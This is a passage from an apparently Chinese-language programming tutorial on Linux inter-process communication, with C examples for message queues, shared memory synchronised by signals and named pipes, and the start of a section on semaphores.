时删除临时文件并销毁消息队列</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">removeMessageQueue</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove(PATHNAME);</span><br><span class="line">msgctl(msgId, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/获取消息队列 id</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createMessageQueue</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(PATHNAME, O_RDWR|O_CREAT, <span class="number">0664</span>);<span class="comment">// 创建一个临时文件</span></span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create Tmp File Failed&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">key_t</span> key = ftok(PATHNAME, <span class="string">&#x27;a&#x27;</span>);<span class="comment">// 根据临时文件路径生成 key</span></span><br><span class="line"><span class="keyword">int</span> msgId = msgget(key, <span class="number">0664</span>|IPC_CREAT);<span class="comment">// 根据 key 生成/获取消息队列 id</span></span><br><span class="line"><span class="keyword">if</span>(msgId == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create/Get Queue Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> msgId;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">if</span>(argc &lt; <span class="number">2</span>)</span><br><span class="line">printError(<span class="string">&quot;Please bring the type you want to receive&quot;</span>);</span><br><span class="line"><span class="keyword">long</span> mtype = atol(argv[<span class="number">1</span>]);<span class="comment">// 通过命令行参数指定自己的邮箱地址</span></span><br><span class="line">msgId = createMessageQueue();</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程接收在自己邮箱中的消息</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;msgRecvPackage, <span class="number">0</span>, <span class="keyword">sizeof</span>(msgBuf));</span><br><span class="line"><span class="keyword">int</span> recvSize =  msgrcv(msgId, &amp;msgRecvPackage, MSGSIZE, mtype, <span class="number">0</span>);</span><br><span class="line">write(<span class="number">1</span>, msgRecvPackage.mtext, recvSize);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程向其他进程发送消息</span></span><br><span class="line">signal(SIGINT, removeMessageQueue);</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(&amp;msgSendPackage, <span class="number">0</span>, <span class="keyword">sizeof</span>(msgBuf));</span><br><span class="line"><span class="built_in">scanf</span>(<span class="string">&quot;%ld&quot;</span>, &amp;msgSendPackage.mtype);<span class="comment">// 目的邮箱与消息正文由终端输入</span></span><br><span class="line">read(<span class="number">0</span>, msgSendPackage.mtext, <span class="keyword">sizeof</span>(msgSendPackage.mtext));</span><br><span class="line">msgsnd(msgId, &amp;msgSendPackage, MSGSIZE, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="../img/x1.png" alt="消息队列"></p><br><h3 id="共享内存"><a href="#共享内存" class="headerlink" title="共享内存"></a>共享内存</h3><blockquote><p>原理</p></blockquote><p>之前提到虚拟内存的出现使得进程空间独立，各进程间没有交叠的空间。共享内存并不是使得进程间有交叠的空间，而是 OS 在物理内存中划出一块区域，进程将自己空闲的逻辑空间地址一一映射过去，进程在操作该逻辑地址时，相当于直接操作共享的物理内存。多个进程空闲地址都可以映射到同一块共享物理内存，从而实现进程间通信。如图：</p><p><img src="../img/g1.png" alt="共享内存"></p><p>从图中可以看到，进程 A 和 B 都拿出空闲的虚拟内存地址去映射相同的一块物理内存地址，这样 A 在该区域放数据，B 可以取，反之亦然</p><br><blockquote><p>创建并映射共享内存</p></blockquote><p>与消息队列相似，使用 shmget 函数可以创建或获取已存在的共享内存</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">size_t</span> size, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>key：该函数通过 key 值来创建一个具有唯一标识符的共享内存，该值可以为：<ul><li>IPC_PRIVATE：每次调用 msgget 都会创建新的共享内存</li><li>指定一个整型数：容易重复</li><li><strong>使用 ftok 函数生成</strong></li></ul></li><li>size：指定共享内存的大小，一般是虚拟页的大小(4k)的整数倍</li><li>shmflg：创建消息队列时的原始权限，需至少具有读写权限。创建新队列时，还需指定 IPC_CREAT 选项</li></ul></li><li>返回：<ul><li>成功返回共享内存的 shmid</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>光创建/获取到共享内存还不够，进程需调用 shmat 函数将自己空闲的虚拟内存地址映射过去：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">shmat</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">const</span> <span class="keyword">void</span> *shmaddr, <span class="keyword">int</span> shmflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>shmid：共享内存标识符</li><li>shmaddr：指定虚拟内存映射的起始地址，有两种设置方式：<ul><li>自己指定</li><li>NULL：由 OS 自己选择，一般使用这种方式</li></ul></li><li>shmflg：指定映射条件：<ul><li>0：可读可写的方式映射</li><li>SHM_RDONLY：只读方式映射</li></ul></li></ul></li><li>返回：<ul><li>成功返回映射起始地址</li><li>失败返回 (void *)-1，并设置 errno</li></ul></li></ul><br><blockquote><p>取消映射及销毁共享内存</p></blockquote><p><strong>进程结束时会自动取消映射但不会销毁共享内存</strong>，取消映射的函数是 shmdt</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmdt</span><span class="params">(<span class="keyword">const</span> <span class="keyword">void</span> *shmaddr)</span></span>;</span><br></pre></td></tr></table></figure><p>参数就是映射的起始地址，成功返回 0，失败返回 -1，并设置 errno</p><p>销毁共享内存的函数是 shmctl，与消息队列的 msgctl 相似，该函数具有控制共享内存的功能，函数原型为：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">shmctl</span><span class="params">(<span class="keyword">int</span> shmid, <span class="keyword">int</span> cmd, struct shmid_ds *buf)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>功能：该函数根据参数 cmd 指定的功能来控制共享内存，可以做到：<ul><li>获取、修改共享内存属性信息</li><li>销毁共享内存等</li></ul></li><li>参数：<ul><li>msqid：共享内存唯一标识符</li><li>cmd：控制选项，常用的有：<ul><li>IPC_STAT：将 shmid 指向的共享内存属性读到第三个参数 buf 中</li><li>IPC_SET：用 buf 中的共享内存属性修改共享内存属性</li><li>IPC_RMID：销毁共享内存，第三个参数为 NULL</li></ul></li><li>buf：根据 cmd 的不同有不同的解释方式</li></ul></li></ul><p>共享内存的属性用一个结构体 shmid_ds 记录，里面记录了共享内存当前映射数量，将其创建的进程 PID 等信息，这里同样不作展开</p><p>此外，当多个进程同时有地址映射在同一片共享内存上时，只有当<strong>所有进程都取消映射</strong>后，调用 shmctl 销毁共享内存才有效。</p><br><blockquote><p>终端中查看共享内存</p></blockquote><p>在终端中可以通过 <strong>ipcs -m</strong> 指令查看当前存在的共享内存</p><p>也可以通过 <strong>ipcrm -m + 对应 shmid</strong> 来删除指定的共享内存</p><br><blockquote><p>代码实现</p></blockquote><p>同样通过服务器-客户端模式来呈现，可以同有名管道一样使用两块共享内存来防止双向通信时进程抢数据。不过这里我打算用一块共享内存 + 同步手段(信号)来实现双向通信。为了使进程间读写数据同步，考虑首先通过两个有名管道将两个进程的 pid 值互相交换。读进程休眠直到写进程完成写操作后通过 kill 函数发送 SIGUSR1 信号唤醒，将数据读出。</p><p>因为两端代码大同小异，可以把重复的代码写进头文件里</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// shareMemory.h</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/shm.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SHMSIZE 4096<span class="comment">// 共享内存大小 4k</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PATHNAME <span class="meta-string">&quot;./shmTmp&quot;</span><span class="comment">// 用于产生 key 值</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME1 <span class="meta-string">&quot;./pipeTmp1&quot;</span><span class="comment">// 两个有名管道</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> FILENAME2 <span class="meta-string">&quot;./pipeTmp2&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> shmId;<span class="comment">// shmid 与 映射的虚拟地址定义为全局变量方便销毁</span></span><br><span class="line"><span class="keyword">void</span> *shmAddr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 打印错误的函数</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">printError</span><span class="params">(<span class="keyword">char</span> *error)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(error);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 处理 SIGUSR1 的函数，什么都不做</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wakeUp</span><span class="params">(<span class="keyword">int</span> signo)</span> </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 服务器端按下 Ctrl+C 时删除临时文件、关闭映射、销毁共享内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">serverRemoveSharedMemory</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">remove(PATHNAME);</span><br><span class="line">remove(FILENAME1);</span><br><span class="line">remove(FILENAME2);</span><br><span class="line">shmdt(shmAddr);</span><br><span class="line">shmctl(shmId, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 客户端按下 Ctrl+C 时关闭映射、销毁共享内存</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">clientRemoveSharedMemory</span><span class="params">(<span class="keyword">int</span> signo)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">shmdt(shmAddr);</span><br><span class="line">shmctl(shmId, IPC_RMID, <span class="literal">NULL</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/打开有名管道</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createNamedPipe</span><span class="params">(<span class="keyword">char</span> *filename, <span class="keyword">int</span> mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> ret, file;</span><br><span class="line"></span><br><span class="line">ret = mkfifo(filename, <span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span> &amp;&amp; errno != EEXIST)</span><br><span class="line">printError(<span class="string">&quot;Create Named Pipe Failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">file = open(filename, mode);</span><br><span class="line"><span class="keyword">if</span>(file == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Open File Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> file;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 创建/获取共享内存 id</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">createSharedMemory</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> fd = open(PATHNAME, O_RDWR|O_CREAT, <span class="number">0664</span>);</span><br><span class="line"><span class="keyword">if</span>(fd == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create Tmp File Failed&quot;</span>);</span><br><span class="line">close(fd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">key_t</span> key = ftok(PATHNAME, <span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">int</span> shmId = shmget(key, SHMSIZE, <span class="number">0664</span>|IPC_CREAT);</span><br><span class="line"><span class="keyword">if</span>(shmId == <span class="number">-1</span>)</span><br><span class="line">printError(<span class="string">&quot;Create/Get Shared Memory Failed&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> shmId;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>服务器端代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc shareMemory1.c -o s1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shareMemory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[SHMSIZE];</span><br><span class="line"></span><br><span class="line">shmId = createSharedMemory();<span class="comment">// 得到共享内存 id</span></span><br><span class="line">shmAddr = shmat(shmId, <span class="literal">NULL</span>, <span class="number">0</span>);<span class="comment">// 得到用于映射的虚拟内存地址</span></span><br><span class="line"><span class="keyword">int</span> pipeFile1 = createNamedPipe(FILENAME1, O_WRONLY);<span class="comment">// 两个有名管道用于交换 pid</span></span><br><span class="line"><span class="keyword">int</span> pipeFile2 = createNamedPipe(FILENAME2, O_RDONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程用于接收数据</span></span><br><span class="line"><span class="keyword">pid_t</span> selfPid = getpid();</span><br><span class="line">signal(SIGUSR1, wakeUp);</span><br><span class="line">write(pipeFile1, &amp;selfPid, <span class="keyword">sizeof</span>(<span class="keyword">pid_t</span>));<span class="comment">// 告诉客户端自己接收数据进程的 pid</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pause();<span class="comment">// 首先通过 pause 休眠，直到客户端写进程发送 SIGUSR1 信号唤醒</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Server recv: %s&quot;</span>, (<span class="keyword">char</span> *)shmAddr);<span class="comment">// 打印信息并清空共享内存</span></span><br><span class="line"><span class="built_in">memset</span>(shmAddr, <span class="number">0</span>, SHMSIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程用于写数据</span></span><br><span class="line"><span class="keyword">pid_t</span> otherPid = <span class="number">0</span>;</span><br><span class="line">signal(SIGINT, serverRemoveSharedMemory);</span><br><span class="line">read(pipeFile2, &amp;otherPid, <span class="keyword">sizeof</span>(<span class="keyword">pid_t</span>));<span class="comment">// 获取客户端接收数据进程的 pid</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));<span class="comment">// 从终端读入信息至 buf</span></span><br><span class="line"><span class="built_in">memcpy</span>(shmAddr, buf, SHMSIZE);<span class="comment">// 拷贝至共享内存区域</span></span><br><span class="line">kill(otherPid, SIGUSR1);<span class="comment">// 写好数据通知客户端接收</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>客户端代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc shareMemory2.c -o s2</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;shareMemory.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">char</span> buf[SHMSIZE];</span><br><span class="line"></span><br><span class="line">shmId = createSharedMemory();</span><br><span class="line">shmAddr = shmat(shmId, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">int</span> pipeFile1 = createNamedPipe(FILENAME1, O_RDONLY);</span><br><span class="line"><span class="keyword">int</span> pipeFile2 = createNamedPipe(FILENAME2, O_WRONLY);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!fork())</span><br><span class="line">&#123;<span class="comment">// 子进程用于写数据</span></span><br><span class="line"><span class="keyword">pid_t</span> otherPid = <span class="number">0</span>;</span><br><span class="line">read(pipeFile1, &amp;otherPid, <span class="keyword">sizeof</span>(<span class="keyword">pid_t</span>));<span class="comment">// 获取服务器端接收数据的进程 pid</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">read(<span class="number">0</span>, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="built_in">memcpy</span>(shmAddr, buf, SHMSIZE);</span><br><span class="line">kill(otherPid, SIGUSR1);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;<span class="comment">// 父进程用于接收数据</span></span><br><span class="line"><span class="keyword">pid_t</span> selfPid = getpid();</span><br><span class="line">signal(SIGUSR1, wakeUp);</span><br><span class="line">signal(SIGINT, clientRemoveSharedMemory);</span><br><span class="line">write(pipeFile2, &amp;selfPid, <span class="keyword">sizeof</span>(<span class="keyword">pid_t</span>));<span class="comment">// 告诉服务器端自己接收数据的进程 pid</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">pause();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Client recv: %s&quot;</span>, (<span class="keyword">char</span> *)shmAddr);</span><br><span class="line"><span class="built_in">memset</span>(shmAddr, <span class="number">0</span>, SHMSIZE);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果：</p><p><img src="../img/g2.png" alt="共享内存"></p><br><h3 id="信号量"><a href="#信号量" class="headerlink" title="信号量"></a>信号量</h3><blockquote><p>原理</p></blockquote><p>设想现有 A，B 两个进程想要写同一个文件，这两个进程要写的数据很大，在他们各自的 1 个时间片内都写不完，如果对文件没有资源保护的手段，那么 A 进程的数据写了一半，B 进程又拿过去写，就会破坏 A 进程数据的连续性。为了解决这个问题，A 在自己数据没写完的情况下将文件上锁。A 时间片用尽，切换到 B 时，B 一看文件上有把锁，就无法往文件里写东西了。再切换回 A 时，A 又可以继续往文件里写剩下的数据，写完后将锁解开。这样下次切换到 B 时，B 就可以对文件进行操作了，A 上的锁就是所谓的信号量。</p><p>以上是对信号量直观的感受，具体实现时，<strong>一个信号量就相当于 OS 声明的一个全局变量</strong>，所有进程都可以访问，上述例子就可以转化为：假设信号量初始值是 1（表示文件还未被任何进程占用），A 进程在开始写文件之前先将信号量值减 1（P 操作），表示 A 占用了这个文件资源（上锁）。A 写完所有数据后，将信号量值加 1（V 操作），表示文件可以被其他进程占用了（释放锁）。所以不论 A 要写多少个时间片，只要没写完，信号量的值一直都会是 0。切换到 B 进程时，B 进程访问信号量的值，值为 0，说明文件上了锁，不该我操作，我就休眠；值为 1，说明别的进程操作完了，我可以操作了，于是 B 进程同样在开始写数据前将信号量减 1，在写完数据后加 1。这样一来，不论多少个进程要写同一个文件，只要他们共享同一个信号量，就可以保证他们对文件操作的<strong>互斥性</strong></p><p>在保证<strong>互斥</strong>的基础上，如果再对使用文件的进程顺序有要求（比如必须 A 先写，B 再读），也可以用信号量实现，这就是所谓的<strong>同步</strong></p><p>综上所述，信号量可以满足多进程对资源访问的<strong>互斥</strong>和<strong>同步</strong>要求</p><br><blockquote><p>创建信号量集并为其中信号量赋初值</p></blockquote><p>Linux 中不能单独创建一个信号量，但可以创建一个信号量集，使其中仅包含一个信号量，创建的 API 是 semget</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semget</span><span class="params">(<span class="keyword">key_t</span> key, <span class="keyword">int</span> nsems, <span class="keyword">int</span> semflg)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>参数：<ul><li>key：同消息队列与共享内存</li><li>nsems：指定信号集中信号量的数量</li><li>semflg：同消息队列与共享内存</li></ul></li><li>返回值：<ul><li>成功返回信号量集 id</li><li>失败返回 -1，并设置 errno</li></ul></li></ul><p>为信号量集中的信号量赋初值使用 semctl 函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ipc.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">semctl</span><span class="params">(<span class="keyword">int</span> semid, <span class="keyword">int</span> semnum, <span class="keyword">int</span> 